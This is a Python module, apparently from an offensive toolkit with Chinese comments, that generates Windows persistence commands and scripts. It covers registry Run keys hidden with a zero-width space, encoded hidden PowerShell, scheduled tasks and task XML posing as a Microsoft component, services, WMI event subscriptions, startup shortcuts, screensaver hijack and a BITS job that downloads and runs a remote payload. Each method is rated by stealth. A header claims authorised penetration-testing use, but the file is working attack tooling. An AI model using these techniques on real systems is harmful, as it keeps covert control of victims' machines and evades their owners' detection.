#!/usr/bin/env python3
"""
Windows 持久化模块 - Windows Persistence
功能: 注册表、计划任务、服务、WMI订阅、启动项
仅用于授权渗透测试
"""

import os
import base64
import random
import string
import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)


class PersistenceMethod(Enum):
    """持久化方法"""
    REGISTRY_RUN = "registry_run"
    REGISTRY_RUNONCE = "registry_runonce"
    SCHEDULED_TASK = "scheduled_task"
    SERVICE = "service"
    WMI_SUBSCRIPTION = "wmi_subscription"
    STARTUP_FOLDER = "startup_folder"
    LOGON_SCRIPT = "logon_script"
    SCREENSAVER = "screensaver"
    BITS_JOB = "bits_job"
    DLL_HIJACK = "dll_hijack"


@dataclass
class PersistenceResult:
    """持久化结果"""
    success: bool
    method: str
    location: str
    cleanup_command: str = ""
    error: str = ""


class WindowsPersistence:
    """
    Windows 持久化生成器

    Usage:
        persistence = WindowsPersistence()

        # 注册表持久化
        result = persistence.registry_run(
            name="WindowsUpdate",
            payload_path="C:\\Windows\\Temp\\payload.exe"
        )

        # 计划任务持久化
        result = persistence.scheduled_task(
            name="SystemHealthCheck",
            payload_path="C:\\Windows\\Temp\\payload.exe",
            trigger="onlogon"
        )
    """

    def __init__(self):
        self._random_prefix = ''.join(random.choices(string.ascii_letters, k=4))

    def _generate_name(self, prefix: str = "Win") -> str:
        """生成随机名称"""
        suffixes = ["Update", "Service", "Helper", "Manager", "Monitor", "Agent"]
        return f"{prefix}{random.choice(suffixes)}"

    # ==================== 注册表持久化 ====================

    def registry_run(self,
                     payload_path: str,
                     name: str = "",
                     hive: str = "HKCU",
                     hidden: bool = False) -> PersistenceResult:
        """
        注册表 Run 键持久化

        Args:
            payload_path: Payload 路径
            name: 注册表项名称
            hive: 注册表配置单元 (HKCU/HKLM)
            hidden: 是否使用隐藏技术
        """
        name = name or self._generate_name()

        if hive == "HKCU":
            reg_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
        else:
            reg_path = r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

        # 隐藏技术: 使用 Unicode 空白字符
        if hidden:
            name = "\u200b" + name  # Zero-width space

        command = f'reg add "{reg_path}" /v "{name}" /t REG_SZ /d "{payload_path}" /f'
        cleanup = f'reg delete "{reg_path}" /v "{name}" /f'

        return PersistenceResult(
            success=True,
            method=PersistenceMethod.REGISTRY_RUN.value,
            location=f"{reg_path}\\{name}",
            cleanup_command=cleanup
        )

    def registry_run_powershell(self,
                                 payload_path: str,
                                 name: str = "",
                                 encoded: bool = True) -> PersistenceResult:
        """
        注册表 Run 键 + PowerShell 启动

        Args:
            payload_path: Payload 路径或 PowerShell 命令
            name: 注册表项名称
            encoded: 是否 Base64 编码
        """
        name = name or self._generate_name("PS")

        if encoded:
            # Base64 编码 PowerShell 命令
            ps_cmd = f'IEX (Get-Content "{payload_path}" -Raw)'
            encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
            value = f'powershell.exe -WindowStyle Hidden -EncodedCommand {encoded_cmd}'
        else:
            value = f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "{payload_path}"'

        reg_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
        command = f'reg add "{reg_path}" /v "{name}" /t REG_SZ /d "{value}" /f'
        cleanup = f'reg delete "{reg_path}" /v "{name}" /f'

        return PersistenceResult(
            success=True,
            method=PersistenceMethod.REGISTRY_RUN.value,
            location=f"{reg_path}\\{name}",
            cleanup_command=cleanup
        )

    # ==================== 计划任务持久化 ====================

    def scheduled_task(self,
                       payload_path: str,
                       name: str = "",
                       trigger: str = "onlogon",
                       interval_minutes: int = 0,
                       run_level: str = "limited") -> PersistenceResult:
        """
        计划任务持久化

        Args:
            payload_path: Payload 路径
            name: 任务名称
            trigger: 触发器 (onlogon/onstart/daily/minute)
            interval_minutes: 间隔分钟数 (trigger=minute 时)
            run_level: 运行级别 (limited/highest)
        """
        name = name or self._generate_name("Task")

        # 构建触发器参数
        if trigger == "onlogon":
            trigger_arg = "/sc onlogon"
        elif trigger == "onstart":
            trigger_arg = "/sc onstart"
        elif trigger == "daily":
            trigger_arg = "/sc daily /st 09:00"
        elif trigger == "minute":
            interval = interval_minutes or 30
            trigger_arg = f"/sc minute /mo {interval}"
        else:
            trigger_arg = "/sc onlogon"

        # 运行级别
        rl_arg = "/rl highest" if run_level == "highest" else ""

        command = f'schtasks /create /tn "{name}" /tr "{payload_path}" {trigger_arg} {rl_arg} /f'
        cleanup = f'schtasks /delete /tn "{name}" /f'

        return PersistenceResult(
            success=True,
            method=PersistenceMethod.SCHEDULED_TASK.value,
            location=f"Task Scheduler\\{name}",
            cleanup_command=cleanup
        )

    def scheduled_task_xml(self,
                           payload_path: str,
                           name: str = "",
                           hidden: bool = True) -> Dict[str, str]:
        """
        生成计划任务 XML 文件 (更隐蔽)

        Returns:
            包含 XML 内容和导入命令
        """
        name = name or self._generate_name("Task")

        xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows System Health Monitor</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <Hidden>{str(hidden).lower()}</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{payload_path}</Command>
    </Exec>
  </Actions>
</Task>'''

        return {
            "xml_content": xml_content,
            "import_command": f'schtasks /create /tn "{name}" /xml task.xml /f',
            "cleanup_command": f'schtasks /delete /tn "{name}" /f',
            "task_name": name
        }

    # ==================== 服务持久化 ====================

    def service_create(self,
                       payload_path: str,
                       name: str = "",
                       display_name: str = "",
                       start_type: str = "auto") -> PersistenceResult:
        """
        Windows 服务持久化

        Args:
            payload_path: 服务可执行文件路径
            name: 服务名称
            display_name: 显示名称
            start_type: 启动类型 (auto/demand/disabled)
        """
        name = name or self._generate_name("Svc")
        display_name = display_name or f"Windows {name}"

        command = f'sc create "{name}" binPath= "{payload_path}" start= {start_type} DisplayName= "{display_name}"'
        start_cmd = f'sc start "{name}"'
        cleanup = f'sc stop "{name}" & sc delete "{name}"'

        return PersistenceResult(
            success=True,
            method=PersistenceMethod.SERVICE.value,
            location=f"Services\\{name}",
            cleanup_command=cleanup
        )

    # ==================== WMI 事件订阅 ====================

    def wmi_subscription(self,
                         payload_path: str,
                         name: str = "",
                         trigger: str = "startup") -> Dict[str, str]:
        """
        WMI 事件订阅持久化 (隐蔽性高)

        Args:
            payload_path: Payload 路径
            name: 订阅名称
            trigger: 触发条件 (startup/process/time)
        """
        name = name or self._generate_name("WMI")

        # WQL 查询条件
        if trigger == "startup":
            wql = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        elif trigger == "process":
            wql = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
        else:
            wql = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9 AND TargetInstance.Minute = 0"

        # PowerShell 创建 WMI 订阅
        ps_script = f'''
$FilterName = "{name}_Filter"
$ConsumerName = "{name}_Consumer"
$SubscriptionName = "{name}_Subscription"

# Event Filter
$FilterArgs = @{{
    Name = $FilterName
    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "{wql}"
}}
$Filter = Set-WmiInstance -Namespace "root\\subscription" -Class "__EventFilter" -Arguments $FilterArgs

# Event Consumer
$ConsumerArgs = @{{
    Name = $ConsumerName
    CommandLineTemplate = "{payload_path}"
}}
$Consumer = Set-WmiInstance -Namespace "root\\subscription" -Class "CommandLineEventConsumer" -Arguments $ConsumerArgs

# Binding
$BindingArgs = @{{
    Filter = $Filter
    Consumer = $Consumer
}}
Set-WmiInstance -Namespace "root\\subscription" -Class "__FilterToConsumerBinding" -Arguments $BindingArgs
'''

        cleanup_script = f'''
Get-WmiObject -Namespace "root\\subscription" -Class "__EventFilter" | Where-Object Name -eq "{name}_Filter" | Remove-WmiObject
Get-WmiObject -Namespace "root\\subscription" -Class "CommandLineEventConsumer" | Where-Object Name -eq "{name}_Consumer" | Remove-WmiObject
Get-WmiObject -Namespace "root\\subscription" -Class "__FilterToConsumerBinding" | Where-Object {{ $_.Filter -like "*{name}*" }} | Remove-WmiObject
'''

        return {
            "install_script": ps_script,
            "cleanup_script": cleanup_script,
            "method": PersistenceMethod.WMI_SUBSCRIPTION.value,
            "subscription_name": name
        }

    # ==================== 启动文件夹 ====================

    def startup_folder(self,
                       payload_path: str,
                       name: str = "",
                       all_users: bool = False) -> PersistenceResult:
        """
        启动文件夹持久化

        Args:
            payload_path: Payload 路径
            name: 快捷方式名称
            all_users: 是否所有用户
        """
        name = name or self._generate_name()

        if all_users:
            startup_path = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
        else:
            startup_path = r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

        # 创建快捷方式的 VBScript
        lnk_name = f"{name}.lnk"
        vbs_script = f'''
Set WshShell = CreateObject("WScript.Shell")
Set lnk = WshShell.CreateShortcut("{startup_path}\\{lnk_name}")
lnk.TargetPath = "{payload_path}"
lnk.WindowStyle = 7
lnk.Save
'''

        return PersistenceResult(
            success=True,
            method=PersistenceMethod.STARTUP_FOLDER.value,
            location=f"{startup_path}\\{lnk_name}",
            cleanup_command=f'del "{startup_path}\\{lnk_name}"'
        )

    # ==================== 屏保持久化 ====================

    def screensaver(self, payload_path: str) -> PersistenceResult:
        """
        屏保持久化 (需要管理员权限修改 HKLM)
        """
        commands = [
            'reg add "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "{}" /f'.format(payload_path),
            'reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f',
            'reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60" /f',
        ]

        cleanup_commands = [
            'reg delete "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /f',
        ]

        return PersistenceResult(
            success=True,
            method=PersistenceMethod.SCREENSAVER.value,
            location="HKCU\\Control Panel\\Desktop\\SCRNSAVE.EXE",
            cleanup_command=" & ".join(cleanup_commands)
        )

    # ==================== BITS Job ====================

    def bits_job(self,
                 payload_url: str,
                 local_path: str,
                 name: str = "") -> PersistenceResult:
        """
        BITS Job 持久化 (可用于下载和执行)

        Args:
            payload_url: 远程 Payload URL
            local_path: 本地保存路径
            name: Job 名称
        """
        name = name or self._generate_name("BITS")

        commands = [
            f'bitsadmin /create "{name}"',
            f'bitsadmin /addfile "{name}" "{payload_url}" "{local_path}"',
            f'bitsadmin /SetNotifyCmdLine "{name}" "{local_path}" NUL',
            f'bitsadmin /SetMinRetryDelay "{name}" 60',
            f'bitsadmin /resume "{name}"',
        ]

        return PersistenceResult(
            success=True,
            method=PersistenceMethod.BITS_JOB.value,
            location=f"BITS Job: {name}",
            cleanup_command=f'bitsadmin /cancel "{name}"'
        )

    # ==================== 综合方法 ====================

    def get_all_methods(self, payload_path: str) -> List[Dict[str, Any]]:
        """
        获取所有持久化方法

        Returns:
            所有可用持久化方法的列表
        """
        methods = []

        # 注册表
        result = self.registry_run(payload_path)
        methods.append({
            "method": result.method,
            "location": result.location,
            "cleanup": result.cleanup_command,
            "requires_admin": False,
            "stealth": "low"
        })

        # 计划任务
        result = self.scheduled_task(payload_path)
        methods.append({
            "method": result.method,
            "location": result.location,
            "cleanup": result.cleanup_command,
            "requires_admin": False,
            "stealth": "medium"
        })

        # 服务 (需要管理员)
        result = self.service_create(payload_path)
        methods.append({
            "method": result.method,
            "location": result.location,
            "cleanup": result.cleanup_command,
            "requires_admin": True,
            "stealth": "low"
        })

        # WMI 订阅 (需要管理员)
        wmi_result = self.wmi_subscription(payload_path)
        methods.append({
            "method": wmi_result["method"],
            "location": f"WMI Subscription: {wmi_result['subscription_name']}",
            "cleanup": wmi_result["cleanup_script"],
            "requires_admin": True,
            "stealth": "high"
        })

        # 启动文件夹
        result = self.startup_folder(payload_path)
        methods.append({
            "method": result.method,
            "location": result.location,
            "cleanup": result.cleanup_command,
            "requires_admin": False,
            "stealth": "low"
        })

        return methods


# 便捷函数
def windows_persist(payload_path: str,
                    method: str = "registry",
                    name: str = "",
                    **kwargs) -> Dict[str, Any]:
    """
    Windows 持久化便捷函数

    Args:
        payload_path: Payload 路径
        method: 持久化方法 (registry/task/service/wmi/startup/screensaver/bits)
        name: 名称
        **kwargs: 其他参数
    """
    persistence = WindowsPersistence()

    method_map = {
        "registry": persistence.registry_run,
        "registry_ps": persistence.registry_run_powershell,
        "task": persistence.scheduled_task,
        "service": persistence.service_create,
        "startup": persistence.startup_folder,
        "screensaver": persistence.screensaver,
    }

    if method == "wmi":
        result = persistence.wmi_subscription(payload_path, name, **kwargs)
        return {
            "success": True,
            "method": method,
            "install_script": result["install_script"],
            "cleanup_script": result["cleanup_script"]
        }

    if method == "bits":
        if "payload_url" not in kwargs:
            return {"success": False, "error": "BITS method requires payload_url"}
        result = persistence.bits_job(kwargs["payload_url"], payload_path, name)
    elif method in method_map:
        result = method_map[method](payload_path, name, **kwargs) if name else method_map[method](payload_path, **kwargs)
    else:
        return {"success": False, "error": f"Unknown method: {method}"}

    return {
        "success": result.success,
        "method": result.method,
        "location": result.location,
        "cleanup_command": result.cleanup_command,
        "error": result.error
    }


def list_persistence_methods() -> List[Dict[str, str]]:
    """列出所有可用的持久化方法"""
    return [
        {"method": "registry", "description": "注册表 Run 键", "admin_required": False, "stealth": "low"},
        {"method": "registry_ps", "description": "注册表 + PowerShell", "admin_required": False, "stealth": "medium"},
        {"method": "task", "description": "计划任务", "admin_required": False, "stealth": "medium"},
        {"method": "service", "description": "Windows 服务", "admin_required": True, "stealth": "low"},
        {"method": "wmi", "description": "WMI 事件订阅", "admin_required": True, "stealth": "high"},
        {"method": "startup", "description": "启动文件夹", "admin_required": False, "stealth": "low"},
        {"method": "screensaver", "description": "屏保劫持", "admin_required": False, "stealth": "medium"},
        {"method": "bits", "description": "BITS Job", "admin_required": False, "stealth": "high"},
    ]


if __name__ == "__main__":
    print("Windows Persistence Module")
    print("=" * 50)
    print("\nAvailable methods:")
    for m in list_persistence_methods():
        admin = "[Admin]" if m["admin_required"] else "[User]"
        print(f"  {admin} {m['method']}: {m['description']} (stealth: {m['stealth']})")
